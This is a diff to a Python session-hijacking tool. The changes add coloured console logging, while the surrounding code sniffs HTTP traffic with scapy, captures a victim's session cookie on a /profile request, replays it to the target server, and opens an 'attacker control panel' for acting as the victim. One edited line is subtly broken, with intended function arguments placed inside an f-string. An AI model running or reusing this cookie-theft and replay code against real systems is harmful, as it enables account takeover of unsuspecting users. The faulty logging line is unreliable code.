@@ -16,6 +16,23 @@ import queue
 from scapy.all import sniff, TCP, Raw
 from datetime import datetime
 
+class Colors:
+    RESET = "\033[0m"       # Reset color to default
+    BOLD = "\033[1m"        # Bold text
+    UNDERLINE = "\033[4m"   # Underlined text
+    RED = "\033[31m"        # Red text
+    GREEN = "\033[32m"      # Green text
+    YELLOW = "\033[33m"     # Yellow text
+    BLUE = "\033[34m"       # Blue text
+    MAGENTA = "\033[35m"    # Magenta text
+    CYAN = "\033[36m"       # Cyan text
+    WHITE = "\033[37m"      # White text
+
+
+def log_with_color(msg: str, color: str) -> None:
+    """Print messages with colors."""
+    print(f"{color}{msg}{Colors.RESET}")
+
 # GUI imports are OPTIONAL
 GUI_AVAILABLE = False
 if os.environ.get("DISPLAY"):
@@ -80,9 +97,9 @@ class HTTPSessionHijacker(threading.Thread):
         self.gui.after(100, self._process_gui_queue)
 
 
-    def _update_status(self, message, progress=None):
+    def _update_status(self, message, progress=None, color: str = Colors.RESET):
         now = datetime.now().strftime("%H:%M:%S")
-        print(f"[HIJACK] [{now}] {message}")
+        print(f"{color}[HIJACK] [{now}] {message}{Colors.RESET}")
 
         if self.gui:
             self._gui_queue.put((message, progress))
@@ -187,7 +204,7 @@ class HTTPSessionHijacker(threading.Thread):
                 return
             self._last_seen_cookie = cookie
 
-            self._update_status("Trigger hit: Victim requested /profile with session cookie", 35)
+            self._update_status("Trigger hit: Victim requested /profile with session cookie", 35, Colors.BOLD)
             self._update_status(f"Captured cookie: sessionid={cookie}", 40)
             self._update_status(f"Observed flow: {self.victim_ip} -> {self.target_ip}", 45)
 
@@ -212,7 +229,7 @@ class HTTPSessionHijacker(threading.Thread):
 
             if resp.status_code == 200:
                 self.session_replay_success = True
-                self._update_status("[PASS] Session hijack SUCCESS (HTTP 200)", 80)
+                self._update_status("[PASS] Session hijack SUCCESS (HTTP 200)", 80, Colors.GREEN)
 
                 proof_html = self._save_proof_html(resp.text)
                 report_txt = self._save_report_txt(resp, proof_html)
@@ -224,7 +241,7 @@ class HTTPSessionHijacker(threading.Thread):
                 return True, proof_html
 
             self._update_status(
-                f"[FAIL] Session hijack FAILED. status={resp.status_code}, snippet={resp.text[:120]!r}",
+                f"[FAIL] Session hijack FAILED. status={resp.status_code}, snippet={resp.text[:120]!r}, None, Colors.RED",
                 100,
             )
             return False, None
@@ -294,7 +311,7 @@ class HTTPSessionHijacker(threading.Thread):
 
     def _print_impact_block(self):
         self._update_status("-" * 72)
-        self._update_status("What SUCCESS means (session hijacking impact):")
+        self._update_status("What SUCCESS means (session hijacking impact):", None, Colors.YELLOW)
         self._update_status(" - Attacker can access any page that trusts this session cookie.")
         self._update_status(" - Server cannot distinguish attacker vs victim if cookie is only auth.")
         self._update_status(" - Access persists until logout / expiry / server invalidation.")
@@ -310,7 +327,7 @@ class HTTPSessionHijacker(threading.Thread):
         while True:
             try:
                 print("\n" + "=" * 80)
-                print("ATTACKER CONTROL PANEL (acting as victim via stolen session cookie)")
+                log_with_color("ATTACKER CONTROL PANEL (acting as victim via stolen session cookie)", Colors.YELLOW)
                 print("=" * 80)
                 print(f"Target: http://{self.target_ip}   Host: {self.target_domain}")
                 print(f"Victim cookie: sessionid={self.stolen_cookie}")
@@ -398,7 +415,7 @@ class HTTPSessionHijacker(threading.Thread):
         self._update_status(f" Victim IP       : {self.victim_ip}")
         self._update_status(f" Target Domain   : {self.target_domain}")
         self._update_status(f" Target IP (web) : {self.target_ip}")
-        self._update_status(" Trigger         : Victim HTTP GET /profile containing sessionid cookie")
+        self._update_status(" Trigger         : Victim HTTP GET /profile containing sessionid cookie", None, Colors.MAGENTA)
         self._update_status("=" * 72)
         self._update_status("Sniffing HTTP traffic...", 20)
 
